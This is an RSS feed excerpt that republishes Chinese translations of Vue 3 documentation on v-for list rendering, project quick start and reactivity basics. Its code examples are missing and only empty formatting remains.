<p><a href="https://play.vuejs.org/#eNpdTsuqwjAQ/ZVDNlFQu5d64bpwJ7g3LopOJdAmIRlFCPl3p60PcDWcM+eV1X8Iq/uN1FrV6RxtYCTiW/gzzvbBR0ZGpBYFbfQ9tEi1ccadvUuM0ERyvKeUmithMyhn+jCSev4WWaY+vZ7HjH5Sr6F33muUhTR8uW0ThTuJua6mPbJEgGSErmEaENedxX3Z+rgxajbEL2DdhR5zOVOdUSIEDOf8M7IULCHsaPgiMa1eK4QcS6rOSkhdfapVeQLQEWnH" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<p><code>v-for</code> 变量的作用域和下面的 JavaScript 代码很类似：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意 <code>v-for</code> 是如何对应 <code>forEach</code> 回调的函数签名的。实际上，您也可以在定义 <code>v-for</code> 的变量别名时使用解构，和解构函数参数类似：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>对于多层嵌套的 <code>v-for</code>，作用域的工作方式和函数的作用域很类似。每个 <code>v-for</code> 作用域都可以访问到父级作用域：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>您也可以使用 <code>of</code> 作为分隔符来替代 <code>in</code>，这更接近 JavaScript 的迭代器语法：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2> v-for 与对象</h2>
<p>您也可以使用 <code>v-for</code> 来遍历一个对象的所有属性。遍历的顺序会基于对该对象调用 <code>Object.keys()</code> 的返回值来决定。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以通过提供第二个参数表示属性名（例如：key）：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>第三个参数表示位置索引：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://play.vuejs.org/#eNo9jjFvgzAQhf/KE0sSCQKpqg7IqRSpQ9WlWycvBC6KW2NbcKaNEP+9B7Tx4nt33917Y3IKYT9ESspE9XVnAqMnjuFZO9MG3zFGdFTVbAbChEvnW2yE32inXe1dz2hv7+dPqhnHO7kdtQPYsKUSm1f/DfZoPKzpuYdx+JAL6cxUka++E+itcoQX/9cO8SzslZoTy+yhODxlxWN2KMR22mmn8jWrpBTB1AZbMc2KVbTyQ56yBkN28d1RJ9uhspFSfNEtFf+GfnZzjP/oOll2NQPjuM4xTftZyIaU5VwuN0SsqMqtWZxUvliq/J4jmX4BTCp08A==" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<h2> 在 v-for 里使用范围值</h2>
<p><code>v-for</code> 可以直接接受一个整数值。在这种用例中，会将该模板基于 <code>1...n</code> 的取值范围重复多次。</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>此处 <code>n</code> 的初值是从 <code>1</code> 开始而非 <code>0</code></p>
</div>
<h2> &lt;template&gt; 上的 v-for</h2>
<p>与模板上的 <code>v-if</code> 类似，您也可以在 <code>&lt;template&gt;</code> 标签上使用 <code>v-for</code> 来渲染一个包含多个元素的块。例如：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> v-for 与 v-if</h2>
<div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>同时使用 <code>v-if</code> 和 <code>v-for</code> 是 <strong>不推荐的</strong>，因为这样二者的优先级不明显。请转阅 <a href="https://cn.vuejs.org/style-guide/rules-essential.html#avoid-v-if-with-v-for" target="_blank" rel="noopener noreferrer">风格指南</a> 查看更多细节</p>
</div>
<p>当它们同时存在于一个节点上时，<code>v-if</code> 比 <code>v-for</code> 的优先级更高。这意味着 <code>v-if</code> 的条件将无法访问到 <code>v-for</code> 作用域内定义的变量别名：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在外新包装一层 <code>&lt;template&gt;</code> 再在其上使用 <code>v-for</code> 可以解决这个问题（这也更加明显易读——）：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 通过 key 管理状态</h2>
<p>Vue 默认按照 “就地更新” 的策略来更新通过 <code>v-for</code> 渲染的元素列表。当数据项的顺序改变时，Vue 不会随之移动 DOM 元素的顺序，而是就地更新每个元素，确保它们在原本指定的索引位置上渲染。</p>
<p>默认模式是高效的，但 <strong>只适用于列表渲染输出的结果不依赖子组件状态或者临时 DOM 状态（例如：表单输入值）的情况。</strong></p>
<p>为了给 Vue 一个提示，以便它可以跟踪每个节点的标识，从而重用和重新排序现有的元素，您需要为每个元素对应的块提供一个唯一的 <code>key</code> attribute：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当您使用 <code>&lt;template v-for&gt;</code> 时，<code>key</code> 应该被放置在这个 <code>&lt;template&gt;</code> 容器上：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p><code>key</code> 在这里是一个通过 <code>v-bind</code> 绑定的特殊 attribute。请不要和 <a href="#v-for-%E4%B8%8E%E5%AF%B9%E8%B1%A1">在 <code>v-for</code> 中使用对象</a> 里所提到的对象属性名相混淆</p>
</div>
<p><a href="https://cn.vuejs.org/style-guide/rules-essential.html#use-keyed-v-for" target="_blank" rel="noopener noreferrer">推荐</a> 在任何可行的时候为 <code>v-for</code> 提供一个 <code>key</code> attribute，除非所迭代的 DOM 内容非常简单（例如：不包含组件或有状态的 DOM 元素），或者您想有意采用默认行为来提高性能。</p>
<p><code>key</code> 绑定的值期望是一个基础类型的值，例如：字符串或 number 类型。不要用对象作为 <code>v-for</code> 的 key。关于 <code>key</code> attribute 的更多用途细节，请参阅 <a href="https://cn.vuejs.org/api/built-in-special-attributes.html#key" target="_blank" rel="noopener noreferrer"><code>key</code> API 文档</a>。</p>
<h2> 组件上使用 v-for</h2>
<div class="hint-container info">
<p class="hint-container-title">相关信息</p>
<p>这一小节假设您已了解 <a href="">组件</a> 的相关知识，或者您也可以先跳过这里，之后再回来看</p>
</div>
<p>直接在组件上使用 <code>v-for</code> 和在一般的元素上使用没有区别（别忘记提供一个 <code>key</code>）：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但是，这不会自动将任何数据传递给组件，因为组件有自己独立的作用域。为了将迭代后的数据传递到组件中，还需要传递 props：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>不自动将 <code>item</code> 注入组件的原因是，这会使组件与 <code>v-for</code> 的工作方式紧密耦合。明确其数据的来源可以使组件在其他情况下重用。</p>
<p>这里是一个简单的 <a href="https://play.vuejs.org/#eNp1U8Fu2zAM/RXCGGAHTWx02ylwgxZYB+ywYRhyq3dwLGYRYkuCJTsZjPz7KMmK3ay9JBQfH/meKA/Rk1Jp32G0jnJdtVwZ0Gg6tSkEb5RsDQzQ4h4usG9lAzGVxldoK5n8ZrAZsTQLCduRygAKUUmhDQg8WWyLZwMPtmESx4sAGkL0mH6xrMH+AHC2hvuljw03Na4h/iLBHBAY1wfUbsTFVcwoH28o2/KIIDuaQ0TTlvrwNu/TDe+7PDlKXZ6EZxTiN4kuRI3W0dk4u4yUf7bZfScqw6WAkrEf3m+y8AOcw7Qv6w5T1elDMhs7Nbq7e61gdmme60SQAvgfIhExiSSJeeb3SBukAy1D1aVBezL5XrYN9Csp1rrbNdykqsUehXkookl0EVGxlZHX5Q5rIBLhNHFlbRD6xBiUzlOeuZJQz4XqjI+BxjSSYe2pQWwRBZizV01DmsRWeJA1Qzv0Of2TwldE5hZRlVd+FkbuOmOksJLybIwtkmfWqg+7qz47asXpSiaN3lxikSVwwfC8oD+/sEnV+oh/qcxmU85mebepgLjDBD622Mg+oDrVquYVJm7IEu4XoXKTZ1dho3gnmdJhedEymn9ab3ysDPdc4M9WKp28xE5JbB+rzz/Trm3eK3LAu8/E7p2PNzYM/i3ChR7W7L7hsSIvR7L2Aal1EhqTp80vF95sw3WcG7r8A0XaeME=" target="_blank" rel="noopener noreferrer">Todo List 的例子</a>，展示了如何通过 <code>v-for</code> 来渲染一个组件列表，并向每个实例中传入不同的数据。</p>
<h2> 数组变化侦测</h2>
<h3> 变更方法</h3>
<p>Vue 能够侦听响应式数组的变更方法，并在它们被调用时触发相关的更新。这些变更方法包括：</p>
<ul>
<li><code>push()</code></li>
<li><code>pop()</code></li>
<li><code>shift()</code></li>
<li><code>unshift()</code></li>
<li><code>splice()</code></li>
<li><code>sort()</code></li>
<li><code>reverse()</code></li>
</ul>
<h3> 替换一个数组</h3>
<p>变更方法，顾名思义，就是会对调用它们的原数组进行变更。相对地，也有一些不可变（immutable）方法，例如：<code>filter()</code>，<code>concat()</code> 和 <code>slice()</code>，这些都不会更改原数组，而总是 <strong>返回一个新数组</strong>。当遇到的是非变更方法时，需要将旧的数组替换为新的：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>您可能认为这将导致 Vue 丢弃现有的 DOM 并重新渲染整个列表——幸运的是，情况并非如此。Vue 实现了一些巧妙的方法来最大化对 DOM 元素的重用，因此用另一个包含部分重叠对象的数组来做替换，仍会是一种非常高效的操作。</p>
<h2> 展示过滤或排序后的结果</h2>
<p>有时，希望显示数组经过过滤或排序后的内容，而不实际变更或重置原始数据。在这种情况下，您可以创建返回已过滤或已排序数组的计算属性。</p>
<p>例如：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在计算属性不可行的情况下（例如：在多层嵌套的 <code>v-for</code> 循环中），您可以使用以下方法：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在计算属性中使用 <code>reverse()</code> 和 <code>sort()</code> 的该时候务必小心！这两个方法将变更原始数组，计算函数中不应这么做。请在调用这些方法之前创建一个原数组的副本：</p>
<div class="language-diff line-numbers-mode" data-ext="diff"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>快速上手</title>
      <link>https://sankgao.github.io/computers/framework/vue3/quick_start.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/quick_start.html</guid>
      <source url="https://sankgao.github.io/rss.xml">快速上手</source>
      <description>线上尝试 Vue​ 想要快速体验 Vue，您可以直接试试 Vue 官网的 演练场 (https://sfc.vuejs.org/#eNo9j01qAzEMha+iapMWOjbdDm6gu96gG2/cjJJM8B+2nBaGuXvlpBMwtj4/JL234EfO6toIRzT1UObMexvpN6fCMNHRNc+w2AgwOXbPL/caoBC3...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 线上尝试 Vue​</h2>
<ul>
<li>想要快速体验 Vue，您可以直接试试 Vue 官网的 <a href="https://sfc.vuejs.org/#eNo9j01qAzEMha+iapMWOjbdDm6gu96gG2/cjJJM8B+2nBaGuXvlpBMwtj4/JL234EfO6toIRzT1UObMexvpN6fCMNHRNc+w2AgwOXbPL/caoBC3EjcCCPU0wu6TvE/wlYqfnnZ3ae2PXHKMfiwQYArZOyYhAHN+2y9LnwLrarTQ7XeOuTFch5Am8u8WRbcoktGPbnzFOXS3Q3BZXWqKkuRmy/4L1eK4GbUoUTtbPDPnOmpdj4ee/1JVKictlSot8hxIUQ3Dd0k/lYoMtrglwfUPkXdoJg==" target="_blank" rel="noopener noreferrer">演练场</a></li>
<li>如果您更喜欢不用任何构建的原始 HTML，可以使用 <a href="https://jsfiddle.net/yyx990803/2ke1ab0z/" target="_blank" rel="noopener noreferrer">JSFiddle</a> 入门</li>
<li>如果您已经比较熟悉 <code>Node.js</code> 和构建工具等概念，还可以直接在浏览器中打开 <a href="https://vite.new/vue" target="_blank" rel="noopener noreferrer">StackBlitz</a> 来尝试完整的构建设置</li>
</ul>
<h2> 创建一个 Vue 应用​</h2>
<div class="hint-container tip">
<p class="hint-container-title">前提条件</p>
<ul>
<li>熟悉命令行</li>
<li>已安装 16.0 或更高版本的 Node.js</li>
</ul>
</div>
<p>在本节中，将介绍如何在本地搭建 Vue <a href="/computers/framework/vue3/ways_of_using_vue.html#%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%BA%94%E7%94%A8spa" target="blank">单页应用</a>。创建的项目将使用基于 <a href="https://vitejs.dev/" target="_blank" rel="noopener noreferrer">Vite</a> 的构建设置，并允许使用 Vue 的 <a href="">单文件组件</a>（SFC）。</p>
<p>确保您安装了最新版本的 <a href="https://nodejs.org/en" target="_blank" rel="noopener noreferrer">Node.js</a>，然后在命令行中运行以下命令：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这一指令将会安装并执行 <a href="https://github.com/vuejs/create-vue" target="_blank" rel="noopener noreferrer">create-vue</a>，它是 Vue 官方的项目脚手架工具。您将会看到一些诸如 TypeScript 和测试支持之类的可选功能提示：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果不确定是否要开启某个功能，您可以直接按下回车键选择 <code>No</code>。在项目被创建后，通过以下步骤安装依赖并启动开发服务器：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>您现在应该已经运行起来了您的第一个 Vue 项目！请注意，生成的项目中的示例组件使用的是 <strong>组合式 API</strong> 和 <code>&lt;script setup&gt;</code>，而非 <strong>选项式 API</strong>。下面是一些补充提示：</p>
<ul>
<li>推荐的 IDE 配置是 <a href="https://code.visualstudio.com/" target="_blank" rel="noopener noreferrer">Visual Studio Code</a> + <a href="https://marketplace.visualstudio.com/items?itemName=Vue.volar" target="_blank" rel="noopener noreferrer">Volar 扩展</a>。如果使用其他编辑器，参考 <a href="">IDE 支持</a></li>
<li>更多工具细节，包括与后端框架的整合，请查看 <a href="">工具链指南</a></li>
<li>要了解构建工具 Vite 更多背后的细节，请查看 <a href="https://cn.vitejs.dev/" target="_blank" rel="noopener noreferrer">Vite 文档</a></li>
<li>如果您选择使用 TypeScript，请阅读 <a href="https://cn.vuejs.org/guide/typescript/overview.html" target="_blank" rel="noopener noreferrer">TypeScript 使用指南</a></li>
</ul>
<p>当您准备将应用发布到生产环境时，请运行：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此命令会在 <code>./dist</code> 文件夹中为您的应用创建一个生产环境的构建版本。关于将应用上线生产环境的更多内容，请阅读 <a href="">生产环境部署指南</a>。</p>
<h2> 通过 CDN 使用 Vue​</h2>
<p>您可以借助 <code>script</code> 标签直接通过 <code>CDN</code> 来使用 Vue：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这里我们使用了 <a href="https://unpkg.com/" target="_blank" rel="noopener noreferrer">unpkg</a>，但您也可以使用任何提供 npm 包服务的 <code>CDN</code>，例如：<a href="https://www.jsdelivr.com/package/npm/vue" target="_blank" rel="noopener noreferrer">jsdelivr</a> 或 <a href="https://cdnjs.com/libraries/vue" target="_blank" rel="noopener noreferrer">cdnjs</a>。当然，您也可以下载此文件并自行提供服务。</p>
<p>通过 CDN 使用 Vue 时，<strong>不涉及</strong> 构建步骤。这使得设置更加简单，并且可以用于增强静态的 HTML 或与后端框架集成。但是，您将 <strong>无法使用</strong> 单文件组件（SFC）语法。</p>
<h3> 使用全局构建版本​</h3>
<p>上面的例子使用了全局构建版本的 Vue，该版本的所有顶层 API 都以属性的形式暴露在了全局的 Vue 对象上。</p>
<p>这里有一个使用全局构建版本的例子：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://jsfiddle.net/yyx990803/nw1xg8Lj/" target="_blank" rel="noopener noreferrer">JSFiddle 中的示例</a></p>
<h3> 使用 ES 模块构建版本​</h3>
<p>在本文档的其余部分我们使用的主要是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Modules" target="_blank" rel="noopener noreferrer">ES 模块</a> 语法。</p>
<p>现代浏览器大多都已原生支持 ES 模块。因此可以像这样通过 CDN 以及原生 ES 模块使用 Vue：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="highlight-lines"><br><br><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><br><br><br><br><br><br><br><br><br></div><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container warning">
<p class="hint-container-title">注意</p>
<p>示例中使用了 <code>&lt;script type="module"&gt;</code>，且导入的 CDN URL 指向的是 Vue 的 <strong>ES 模块构建版本</strong></p>
</div>
<p><a href="https://jsfiddle.net/yyx990803/vo23c470/" target="_blank" rel="noopener noreferrer">JSFiddle 中的示例</a></p>
<h3> 启用 Import maps​</h3>
<p>在上面的示例中，使用了完整的 CDN URL 来导入，但在文档的其余部分中，您将看到如下代码：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>还可以使用 <a href="https://caniuse.com/import-maps" target="_blank" rel="noopener noreferrer">导入映射表（Import Maps）</a> 来告诉浏览器如何定位到导入的 <code>vue</code>：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="highlight-lines"><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><br><br><br><br><div class="highlight-line">&nbsp;</div><br><br><br><br><br><br><br><br><br></div><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://jsfiddle.net/yyx990803/2ke1ab0z/" target="_blank" rel="noopener noreferrer">JSFiddle 中的示例</a></p>
<p>您也可以在映射表中添加其他的依赖——但请务必确保您使用的是该库的 ES 模块版本。</p>
<div class="hint-container tip">
<p class="hint-container-title">导入映射表的浏览器支持情况</p>
<p>目前只有基于 Chromium 的浏览器支持导入映射表，所以推荐您在学习过程中使用 Chrome 或 Edge 浏览器</p>
<p>如果您使用的是 Firefox 浏览器，则该功能默认在 108+ 版本或通过启用 <code>about:config</code> 中的 <code>dom.importMaps.enabled</code> 选项支持</p>
<p>如果您更喜欢那些还不支持导入映射表的浏览器，您可以使用 <a href="https://github.com/guybedford/es-module-shims" target="_blank" rel="noopener noreferrer">es-module-shims</a> 来进行 polyfill</p>
</div>
<div class="hint-container warning">
<p class="hint-container-title">生产环境中的注意事项</p>
<p>到目前为止示例中使用的都是 Vue 的开发构建版本——如果您打算在生产中通过 CDN 使用 Vue，请务必查看 <a href="">生产环境部署指南</a></p>
</div>
<h3> 拆分模块</h3>
<p>随着逐步深入，可能需要将代码分割成单独的 JavaScript 文件，以便更容易管理。例如：</p>
<div class="language-html line-numbers-mode" data-ext="html"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果直接在浏览器中打开了上面的 <code>index.html</code>，您会发现它抛出了一个错误，因为 ES 模块不能通过 <code>file://</code> 协议工作。为了使其工作，您需要使用本地 HTTP 服务器通过 <code>http://</code> 协议提供 <code>index.html</code>。</p>
<p>要启动一个本地的 HTTP 服务器，请先安装 <a href="https://nodejs.org/zh/" target="_blank" rel="noopener noreferrer">Node.js</a>，然后通过命令行在 HTML 文件所在文件夹下运行 <code>npx serve</code>。您也可以使用其他任何可以基于正确的 MIME 类型服务静态文件的 HTTP 服务器。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>这里导入的组件模板是内联的 JavaScript 字符串。如果您正在使用 VSCode，您可以安装 <a href="https://marketplace.visualstudio.com/items?itemName=Tobermory.es6-string-html" target="_blank" rel="noopener noreferrer">es6-string-html</a> 扩展，然后在字符串前加上一个前缀注释 <code>/*html*/</code> 以高亮语法</p>
</div>
<h3> 无需构建的组合式 API 用法</h3>
<p>组合式 API 的许多示例将使用 <code>&lt;script setup&gt;</code> 语法。如果您想在无需构建的情况下使用组合式 API，请参阅 <a href="">setup() 选项</a>。</p>
]]></content:encoded>
    </item>
    <item>
      <title>响应式基础</title>
      <link>https://sankgao.github.io/computers/framework/vue3/responsive_base.html</link>
      <guid>https://sankgao.github.io/computers/framework/vue3/responsive_base.html</guid>
      <source url="https://sankgao.github.io/rss.xml">响应式基础</source>
      <description>声明响应式状态 使用 reactive() 函数创建一个响应式对象或数组： 响应式对象其实是 JavaScript Proxy (https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy)，其行为表现与一般对象相似。不同之处在于 Vue ...</description>
      <category>Frontend</category>
      <pubDate>Fri, 28 Apr 2023 00:00:00 GMT</pubDate>
      <content:encoded><![CDATA[<h2> 声明响应式状态</h2>
<p>使用 <code>reactive()</code> 函数创建一个响应式对象或数组：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>响应式对象其实是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Proxy" target="_blank" rel="noopener noreferrer">JavaScript Proxy</a>，其行为表现与一般对象相似。不同之处在于 Vue 能够跟踪对响应式对象属性的访问与更改操作。如果你对这其中的细节感到好奇，将在 <a href="">深入响应式系统</a> 中会进行解释。</p>
<p>TypeScript 用户请参阅：<a href="">为响应式对象标注类型</a> <sup class="vt-badge ts"></sup></p>
<p>要在组件模板中使用响应式状态，需要在 <code>setup()</code> 函数中定义并返回。</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="highlight-lines"><br><br><br><br><div class="highlight-line">&nbsp;</div><br><br><br><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><br><br></div><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>也可以在同一个作用域下定义更新响应式状态的函数，并将它们作为方法与状态一起暴露出去：</p>
<div class="language-javascript line-numbers-mode" data-ext="js"><div class="highlight-lines"><br><br><br><br><br><br><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><div class="highlight-line">&nbsp;</div><br><br><br><br><div class="highlight-line">&nbsp;</div><br><br><br></div><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>暴露的方法通常会被用作事件监听器：</p>
<div class="language-template line-numbers-mode" data-ext="template"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> &lt;script setup&gt;</h3>
<p>在 <code>setup()</code> 函数中手动暴露大量的状态和方法非常繁琐。幸运的是，可以通过使用构建工具来简化该操作。当使用单文件组件（SFC）时，可以使用 <code>&lt;script setup&gt;</code> 来大幅度地简化代码。</p>
<div class="language-vue line-numbers-mode" data-ext="vue"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="https://sfc.vuejs.org/#eyJBcHAudnVlIjoiPHNjcmlwdCBzZXR1cD5cbmltcG9ydCB7IHJlYWN0aXZlIH0gZnJvbSAndnVlJ1xuXG5jb25zdCBzdGF0ZSA9IHJlYWN0aXZlKHsgY291bnQ6IDAgfSlcblxuZnVuY3Rpb24gaW5jcmVtZW50KCkge1xuICBzdGF0ZS5jb3VudCsrXG59XG48L3NjcmlwdD5cblxuPHRlbXBsYXRlPlxuICA8YnV0dG9uIEBjbGljaz1cImluY3JlbWVudFwiPlxuICAgIHt7IHN0YXRlLmNvdW50IH19XG4gIDwvYnV0dG9uPlxuPC90ZW1wbGF0ZT4iLCJpbXBvcnQtbWFwLmpzb24iOiJ7XG4gIFwiaW1wb3J0c1wiOiB7XG4gICAgXCJ2dWVcIjogXCJodHRwczovL3NmYy52dWVqcy5vcmcvdnVlLnJ1bnRpbWUuZXNtLWJyb3dzZXIuanNcIlxuICB9XG59In0=" target="_blank" rel="noopener noreferrer">在演练场中尝试一下</a></p>
<p><code>&lt;script setup&gt;</code> 中的顶层的导入和变量声明可在同一组件的模板中直接使用。你可以理解为模板中的表达式和 <code>&lt;script setup&gt;</code> 中的代码处在同一个作用域中。</p>
<h3> DOM 更新时机</h3>
<p>当你更改响应式状态后，DOM 会自动更新。然而，你得注意 DOM 的更新并不是同步的。相反，Vue 将缓冲它们直到更新周期的 “下个时机” 以确保无论你进行了多少次状态更改，每个组件都只更新一次。</p>
